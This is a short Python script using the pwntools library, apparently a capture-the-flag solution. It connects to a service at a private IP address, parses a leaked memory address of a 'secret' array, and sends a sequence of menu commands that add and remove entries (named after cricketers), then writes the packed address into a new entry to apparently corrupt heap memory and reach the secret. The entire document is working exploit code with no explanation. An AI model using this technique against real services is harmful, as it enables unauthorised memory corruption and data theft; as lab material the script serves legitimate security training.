from pwn import *

conn = remote('10.21.235.179', 1024)

addr_of_secret = conn.recvline()
addr_of_secret = str(addr_of_secret).strip().split(": 0x")[1][:-3]
addr_of_secret = int(addr_of_secret, 16)
addr_of_secret = p64(addr_of_secret)

conn.sendline(b"a")
conn.sendline(b"virat")
conn.sendline(b"1")
conn.sendline(b"a")
conn.sendline(b"dhoni")
conn.sendline(b"2")
conn.sendline(b"a")
conn.sendline(b"sehwag")
conn.sendline(b"3")
conn.sendline(b"r")
conn.sendline(b"3")
conn.sendline(b"r")
conn.sendline(b"2")
conn.sendline(b"r")
conn.sendline(b"1")
conn.sendline(b"a")
conn.sendline(b"ThisIsTheAddressOfTheSecretArray" + addr_of_secret)
conn.sendline(b"1")
conn.sendline(b"a")
conn.sendline(b"Rishabh Pant")
conn.sendline(b"1")
conn.sendline(b"a")
conn.sendline(b"27a12")       # secret code for our team
conn.sendline(b"1")
conn.sendline(b"x")

for i in range(73):
   conn.recvline()
print(conn.recv())